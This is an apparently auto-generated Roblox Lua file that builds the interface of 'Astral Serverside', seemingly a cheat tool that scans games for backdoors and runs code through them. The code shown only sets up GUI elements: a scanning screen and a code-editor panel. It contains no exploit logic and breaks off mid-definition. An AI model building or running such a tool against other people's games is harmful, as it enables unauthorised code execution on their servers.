local ASTRAL = {};

-- StarterGui.Astral Serverside
ASTRAL["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
ASTRAL["1"]["IgnoreGuiInset"] = true;
ASTRAL["1"]["DisplayOrder"] = 1999999999;
ASTRAL["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
ASTRAL["1"]["Name"] = [[Astral Serverside]];
ASTRAL["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
ASTRAL["1"]["ResetOnSpawn"] = false;


-- StarterGui.Astral Serverside.MainFrame
ASTRAL["2"] = Instance.new("Frame", ASTRAL["1"]);
ASTRAL["2"]["BorderSizePixel"] = 0;
ASTRAL["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
ASTRAL["2"]["ClipsDescendants"] = true;
ASTRAL["2"]["Size"] = UDim2.new(0, 450, 0, 275);
ASTRAL["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
ASTRAL["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["2"]["Name"] = [[MainFrame]];
ASTRAL["2"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.Corner
ASTRAL["3"] = Instance.new("UICorner", ASTRAL["2"]);
ASTRAL["3"]["Name"] = [[Corner]];
ASTRAL["3"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.Border
ASTRAL["4"] = Instance.new("UIStroke", ASTRAL["2"]);
ASTRAL["4"]["Name"] = [[Border]];
ASTRAL["4"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Astral Serverside.MainFrame.Border.Rainbow
ASTRAL["5"] = Instance.new("UIGradient", ASTRAL["4"]);
ASTRAL["5"]["Name"] = [[Rainbow]];
ASTRAL["5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};


-- StarterGui.Astral Serverside.MainFrame.Border.Rainbow.Rotation
ASTRAL["6"] = Instance.new("LocalScript", ASTRAL["5"]);
ASTRAL["6"]["Name"] = [[Rotation]];


-- StarterGui.Astral Serverside.MainFrame.Blur
ASTRAL["7"] = Instance.new("LocalScript", ASTRAL["2"]);
ASTRAL["7"]["Name"] = [[Blur]];


-- StarterGui.Astral Serverside.MainFrame.Drag
ASTRAL["8"] = Instance.new("LocalScript", ASTRAL["2"]);
ASTRAL["8"]["Name"] = [[Drag]];


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame
ASTRAL["9"] = Instance.new("Frame", ASTRAL["2"]);
ASTRAL["9"]["Visible"] = false;
ASTRAL["9"]["BorderSizePixel"] = 0;
ASTRAL["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["9"]["ClipsDescendants"] = true;
ASTRAL["9"]["Size"] = UDim2.new(1, 0, 1, 0);
ASTRAL["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["9"]["Name"] = [[ScanningFrame]];
ASTRAL["9"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Corner
ASTRAL["a"] = Instance.new("UICorner", ASTRAL["9"]);
ASTRAL["a"]["Name"] = [[Corner]];
ASTRAL["a"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Description
ASTRAL["b"] = Instance.new("TextLabel", ASTRAL["9"]);
ASTRAL["b"]["TextWrapped"] = true;
ASTRAL["b"]["TextStrokeTransparency"] = 0;
ASTRAL["b"]["BorderSizePixel"] = 0;
ASTRAL["b"]["TextSize"] = 14;
ASTRAL["b"]["TextScaled"] = true;
ASTRAL["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["b"]["BackgroundTransparency"] = 1;
ASTRAL["b"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
ASTRAL["b"]["Size"] = UDim2.new(1, -50, 0, 125);
ASTRAL["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["b"]["Text"] = [[The game might freeze, don't worry it's scanning though.]];
ASTRAL["b"]["Name"] = [[Description]];
ASTRAL["b"]["Position"] = UDim2.new(0.5, 0, 0.5, 48);


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Title
ASTRAL["c"] = Instance.new("TextLabel", ASTRAL["9"]);
ASTRAL["c"]["TextWrapped"] = true;
ASTRAL["c"]["TextStrokeTransparency"] = 0;
ASTRAL["c"]["BorderSizePixel"] = 0;
ASTRAL["c"]["TextSize"] = 14;
ASTRAL["c"]["TextScaled"] = true;
ASTRAL["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["c"]["BackgroundTransparency"] = 1;
ASTRAL["c"]["Size"] = UDim2.new(1, 0, 0, 64);
ASTRAL["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["c"]["Text"] = [[Astral Serverside]];
ASTRAL["c"]["Name"] = [[Title]];
ASTRAL["c"]["Position"] = UDim2.new(0, 0, 0, 10);


-- StarterGui.Astral Serverside.MainFrame.ScanningHandler
ASTRAL["d"] = Instance.new("LocalScript", ASTRAL["2"]);
ASTRAL["d"]["Name"] = [[ScanningHandler]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame
ASTRAL["e"] = Instance.new("Frame", ASTRAL["2"]);
ASTRAL["e"]["BorderSizePixel"] = 0;
ASTRAL["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["e"]["ClipsDescendants"] = true;
ASTRAL["e"]["Size"] = UDim2.new(1, 0, 1, 0);
ASTRAL["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["e"]["Name"] = [[ExecutionFrame]];
ASTRAL["e"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Corner
ASTRAL["f"] = Instance.new("UICorner", ASTRAL["e"]);
ASTRAL["f"]["Name"] = [[Corner]];
ASTRAL["f"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox
ASTRAL["10"] = Instance.new("Frame", ASTRAL["e"]);
ASTRAL["10"]["BorderSizePixel"] = 0;
ASTRAL["10"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
ASTRAL["10"]["AnchorPoint"] = Vector2.new(0.5, 0);
ASTRAL["10"]["ClipsDescendants"] = true;
ASTRAL["10"]["Size"] = UDim2.new(1, -50, 0, 175);
ASTRAL["10"]["Position"] = UDim2.new(0.5, 0, 0, 50);
ASTRAL["10"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["10"]["Name"] = [[FastColoredTextbox]];
ASTRAL["10"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll
ASTRAL["11"] = Instance.new("ScrollingFrame", ASTRAL["10"]);
ASTRAL["11"]["Active"] = true;
ASTRAL["11"]["ZIndex"] = 2;
ASTRAL["11"]["BorderSizePixel"] = 0;
ASTRAL["11"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
ASTRAL["11"]["TopImage"] = [[]];
ASTRAL["11"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
ASTRAL["11"]["Name"] = [[Scroll]];
ASTRAL["11"]["BottomImage"] = [[]];
ASTRAL["11"]["Size"] = UDim2.new(1, 0, 1, 0);
ASTRAL["11"]["ScrollBarImageColor3"] = Color3.fromRGB(43, 43, 43);
ASTRAL["11"]["BorderColor3"] = Color3.fromRGB(127, 129, 126);
ASTRAL["11"]["ScrollBarThickness"] = 17;
ASTRAL["11"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.TextBox
ASTRAL["12"] = Instance.new("TextBox", ASTRAL["11"]);
ASTRAL["12"]["TextXAlignment"] = Enum.TextXAlignment.Left;
ASTRAL["12"]["BorderSizePixel"] = 0;
ASTRAL["12"]["TextWrapped"] = true;
ASTRAL["12"]["TextTransparency"] = 0.75;
ASTRAL["12"]["TextSize"] = 15;
ASTRAL["12"]["TextColor3"] = Color3.fromRGB(42, 42, 42);
ASTRAL["12"]["TextYAlignment"] = Enum.TextYAlignment.Top;
ASTRAL["12"]["BackgroundColor3"] = Color3.fromRGB(29, 35, 46);
ASTRAL["12"]["RichText"] = true;
ASTRAL["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["12"]["MultiLine"] = true;
ASTRAL["12"]["ClearTextOnFocus"] = false;
ASTRAL["12"]["Size"] = UDim2.new(10, -27, 1, 0);
ASTRAL["12"]["Position"] = UDim2.new(0, 17, 0, 0);
ASTRAL["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["12"]["Text"] = [[]];
ASTRAL["12"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.Highlighting
ASTRAL["13"] = Instance.new("TextLabel", ASTRAL["11"]);
ASTRAL["13"]["TextWrapped"] = true;
ASTRAL["13"]["BorderSizePixel"] = 0;
ASTRAL["13"]["TextSize"] = 15;
ASTRAL["13"]["TextXAlignment"] = Enum.TextXAlignment.Left;
ASTRAL["13"]["TextYAlignment"] = Enum.TextYAlignment.Top;
ASTRAL["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["13"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["13"]["BackgroundTransparency"] = 1;
ASTRAL["13"]["RichText"] = true;
ASTRAL["13"]["Size"] = UDim2.new(10, -27, 1, 0);
ASTRAL["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["13"]["Text"] = [[]];
ASTRAL["13"]["Name"] = [[Highlighting]];
ASTRAL["13"]["Position"] = UDim2.new(0, 20, 0, 0);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LineSelector
ASTRAL["14"] = Instance.new("Frame", ASTRAL["11"]);
ASTRAL["14"]["ZIndex"] = -7;
ASTRAL["14"]["BorderSizePixel"] = 0;
ASTRAL["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["14"]["Size"] = UDim2.new(1, 0, 0, 15);
ASTRAL["14"]["Position"] = UDim2.new(0, 20, 0, 0);
ASTRAL["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["14"]["Name"] = [[LineSelector]];
ASTRAL["14"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.Cursor
ASTRAL["15"] = Instance.new("Frame", ASTRAL["11"]);
ASTRAL["15"]["BorderSizePixel"] = 0;
ASTRAL["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["15"]["Size"] = UDim2.new(0, 1, 0, 15);
ASTRAL["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["15"]["Name"] = [[Cursor]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.TextMeasurer
ASTRAL["16"] = Instance.new("TextLabel", ASTRAL["11"]);
ASTRAL["16"]["BorderSizePixel"] = 0;
ASTRAL["16"]["TextSize"] = 15;
ASTRAL["16"]["TextXAlignment"] = Enum.TextXAlignment.Left;
ASTRAL["16"]["TextYAlignment"] = Enum.TextYAlignment.Top;
ASTRAL["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["16"]["BackgroundTransparency"] = 1;
ASTRAL["16"]["RichText"] = true;
ASTRAL["16"]["Size"] = UDim2.new(10, -27, 1, 0);
ASTRAL["16"]["Visible"] = false;
ASTRAL["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["16"]["Text"] = [[]];
ASTRAL["16"]["Name"] = [[TextMeasurer]];
ASTRAL["16"]["Position"] = UDim2.new(0, 20, 0, 0);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesValue
ASTRAL["17"] = Instance.new("NumberValue", ASTRAL["11"]);
ASTRAL["17"]["Name"] = [[LinesValue]];
ASTRAL["17"]["Value"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesFrame
ASTRAL["18"] = Instance.new("Frame", ASTRAL["11"]);
ASTRAL["18"]["BorderSizePixel"] = 0;
ASTRAL["18"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["18"]["Size"] = UDim2.new(0, 17, 17.91826, 0);
ASTRAL["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["18"]["Name"] = [[LinesFrame]];
ASTRAL["18"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesFrame.TextLabelTemplate
ASTRAL["19"] = Instance.new("TextLabel", ASTRAL["18"]);
ASTRAL["19"]["TextWrapped"] = true;
ASTRAL["19"]["BorderSizePixel"] = 0;
ASTRAL["19"]["TextSize"] = 15;
ASTRAL["19"]["TextScaled"] = true;
ASTRAL["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["19"]["TextColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["19"]["BackgroundTransparency"] = 1;
ASTRAL["19"]["Size"] = UDim2.new(0, 17, 0, 15);
ASTRAL["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["19"]["Text"] = [[1]];
ASTRAL["19"]["Name"] = [[TextLabelTemplate]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesFrame.UIListLayout
ASTRAL["1a"] = Instance.new("UIListLayout", ASTRAL["18"]);
ASTRAL["1a"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Handler
ASTRAL["1b"] = Instance.new("LocalScript", ASTRAL["10"]);
ASTRAL["1b"]["Name"] = [[Handler]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top
ASTRAL["1c"] = Instance.new("Frame", ASTRAL["10"]);
ASTRAL["1c"]["Visible"] = false;
ASTRAL["1c"]["ZIndex"] = 3;
ASTRAL["1c"]["BorderSizePixel"] = 0;
ASTRAL["1c"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
ASTRAL["1c"]["Size"] = UDim2.new(0, 17, 0, 17);
ASTRAL["1c"]["Position"] = UDim2.new(1, -17, 0, 0);
ASTRAL["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["1c"]["Name"] = [[Y_Top]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow
ASTRAL["1d"] = Instance.new("Frame", ASTRAL["1c"]);
ASTRAL["1d"]["Size"] = UDim2.new(0, 16, 0, 16);
ASTRAL["1d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["1d"]["Name"] = [[Arrow]];
ASTRAL["1d"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
ASTRAL["1e"] = Instance.new("Frame", ASTRAL["1d"]);
ASTRAL["1e"]["BorderSizePixel"] = 0;
ASTRAL["1e"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["1e"]["Size"] = UDim2.new(0, 7, 0, 1);
ASTRAL["1e"]["Position"] = UDim2.new(0, 5, 0, 9);
ASTRAL["1e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["1e"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
ASTRAL["1f"] = Instance.new("Frame", ASTRAL["1d"]);
ASTRAL["1f"]["BorderSizePixel"] = 0;
ASTRAL["1f"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["1f"]["Size"] = UDim2.new(0, 5, 0, 1);
ASTRAL["1f"]["Position"] = UDim2.new(0, 6, 0, 8);
ASTRAL["1f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["1f"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
ASTRAL["20"] = Instance.new("Frame", ASTRAL["1d"]);
ASTRAL["20"]["BorderSizePixel"] = 0;
ASTRAL["20"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["20"]["Size"] = UDim2.new(0, 3, 0, 1);
ASTRAL["20"]["Position"] = UDim2.new(0, 7, 0, 7);
ASTRAL["20"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["20"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
ASTRAL["21"] = Instance.new("Frame", ASTRAL["1d"]);
ASTRAL["21"]["BorderSizePixel"] = 0;
ASTRAL["21"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["21"]["Size"] = UDim2.new(0, 1, 0, 1);
ASTRAL["21"]["Position"] = UDim2.new(0, 8, 0, 6);
ASTRAL["21"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["21"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Button
ASTRAL["22"] = Instance.new("TextButton", ASTRAL["1c"]);
ASTRAL["22"]["BorderSizePixel"] = 0;
ASTRAL["22"]["TextSize"] = 14;
ASTRAL["22"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["22"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["22"]["BackgroundTransparency"] = 1;
ASTRAL["22"]["Size"] = UDim2.new(1, 0, 1, 0);
ASTRAL["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["22"]["Text"] = [[]];
ASTRAL["22"]["Name"] = [[Button]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm
ASTRAL["23"] = Instance.new("Frame", ASTRAL["10"]);
ASTRAL["23"]["Visible"] = false;
ASTRAL["23"]["ZIndex"] = 3;
ASTRAL["23"]["BorderSizePixel"] = 0;
ASTRAL["23"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
ASTRAL["23"]["Size"] = UDim2.new(0, 17, 0, 17);
ASTRAL["23"]["Position"] = UDim2.new(1, -17, 1, -17);
ASTRAL["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["23"]["Name"] = [[Y_Btm]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Button
ASTRAL["24"] = Instance.new("TextButton", ASTRAL["23"]);
ASTRAL["24"]["BorderSizePixel"] = 0;
ASTRAL["24"]["TextSize"] = 14;
ASTRAL["24"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["24"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["24"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["24"]["BackgroundTransparency"] = 1;
ASTRAL["24"]["Size"] = UDim2.new(1, 0, 1, 0);
ASTRAL["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["24"]["Text"] = [[]];
ASTRAL["24"]["Name"] = [[Button]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow
ASTRAL["25"] = Instance.new("Frame", ASTRAL["23"]);
ASTRAL["25"]["Size"] = UDim2.new(0, 16, 0, 16);
ASTRAL["25"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["25"]["Name"] = [[Arrow]];
ASTRAL["25"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
ASTRAL["26"] = Instance.new("Frame", ASTRAL["25"]);
ASTRAL["26"]["BorderSizePixel"] = 0;
ASTRAL["26"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["26"]["Size"] = UDim2.new(0, 7, 0, 1);
ASTRAL["26"]["Position"] = UDim2.new(0, 5, 0, 7);
ASTRAL["26"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["26"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
ASTRAL["27"] = Instance.new("Frame", ASTRAL["25"]);
ASTRAL["27"]["BorderSizePixel"] = 0;
ASTRAL["27"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["27"]["Size"] = UDim2.new(0, 5, 0, 1);
ASTRAL["27"]["Position"] = UDim2.new(0, 6, 0, 8);
ASTRAL["27"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["27"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
ASTRAL["28"] = Instance.new("Frame", ASTRAL["25"]);
ASTRAL["28"]["BorderSizePixel"] = 0;
ASTRAL["28"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["28"]["Size"] = UDim2.new(0, 3, 0, 1);
ASTRAL["28"]["Position"] = UDim2.new(0, 7, 0, 9);
ASTRAL["28"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["28"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
ASTRAL["29"] = Instance.new("Frame", ASTRAL["25"]);
ASTRAL["29"]["BorderSizePixel"] = 0;
ASTRAL["29"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["29"]["Size"] = UDim2.new(0, 1, 0, 1);
ASTRAL["29"]["Position"] = UDim2.new(0, 8, 0, 10);
ASTRAL["29"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["29"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft
ASTRAL["2a"] = Instance.new("Frame", ASTRAL["10"]);
ASTRAL["2a"]["Visible"] = false;
ASTRAL["2a"]["ZIndex"] = 3;
ASTRAL["2a"]["BorderSizePixel"] = 0;
ASTRAL["2a"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
ASTRAL["2a"]["Size"] = UDim2.new(0, 17, 0, 17);
ASTRAL["2a"]["Position"] = UDim2.new(0, 0, 1, -17);
ASTRAL["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["2a"]["Name"] = [[X_Lft]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Button
ASTRAL["2b"] = Instance.new("TextButton", ASTRAL["2a"]);
ASTRAL["2b"]["BorderSizePixel"] = 0;
ASTRAL["2b"]["TextSize"] = 14;
ASTRAL["2b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["2b"]["BackgroundTransparency"] = 1;
ASTRAL["2b"]["Size"] = UDim2.new(1, 0, 1, 0);
ASTRAL["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["2b"]["Text"] = [[]];
ASTRAL["2b"]["Name"] = [[Button]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow
ASTRAL["2c"] = Instance.new("Frame", ASTRAL["2a"]);
ASTRAL["2c"]["Size"] = UDim2.new(0, 16, 0, 16);
ASTRAL["2c"]["Name"] = [[Arrow]];
ASTRAL["2c"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
ASTRAL["2d"] = Instance.new("Frame", ASTRAL["2c"]);
ASTRAL["2d"]["BorderSizePixel"] = 0;
ASTRAL["2d"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["2d"]["Size"] = UDim2.new(0, 1, 0, 1);
ASTRAL["2d"]["Position"] = UDim2.new(0, 6, 0, 8);
ASTRAL["2d"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
ASTRAL["2e"] = Instance.new("Frame", ASTRAL["2c"]);
ASTRAL["2e"]["BorderSizePixel"] = 0;
ASTRAL["2e"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["2e"]["Size"] = UDim2.new(0, 1, 0, 3);
ASTRAL["2e"]["Position"] = UDim2.new(0, 7, 0, 7);
ASTRAL["2e"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
ASTRAL["2f"] = Instance.new("Frame", ASTRAL["2c"]);
ASTRAL["2f"]["BorderSizePixel"] = 0;
ASTRAL["2f"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["2f"]["Size"] = UDim2.new(0, 1, 0, 5);
ASTRAL["2f"]["Position"] = UDim2.new(0, 8, 0, 6);
ASTRAL["2f"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
ASTRAL["30"] = Instance.new("Frame", ASTRAL["2c"]);
ASTRAL["30"]["BorderSizePixel"] = 0;
ASTRAL["30"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["30"]["Size"] = UDim2.new(0, 1, 0, 7);
ASTRAL["30"]["Position"] = UDim2.new(0, 9, 0, 5);
ASTRAL["30"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght
ASTRAL["31"] = Instance.new("Frame", ASTRAL["10"]);
ASTRAL["31"]["Visible"] = false;
ASTRAL["31"]["ZIndex"] = 3;
ASTRAL["31"]["BorderSizePixel"] = 0;
ASTRAL["31"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
ASTRAL["31"]["Size"] = UDim2.new(0, 17, 0, 17);
ASTRAL["31"]["Position"] = UDim2.new(1, -18, 1, -17);
ASTRAL["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["31"]["Name"] = [[X_Rght]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Button
ASTRAL["32"] = Instance.new("TextButton", ASTRAL["31"]);
ASTRAL["32"]["BorderSizePixel"] = 0;
ASTRAL["32"]["TextSize"] = 14;
ASTRAL["32"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["32"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["32"]["BackgroundTransparency"] = 1;
ASTRAL["32"]["Size"] = UDim2.new(1, 0, 1, 0);
ASTRAL["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
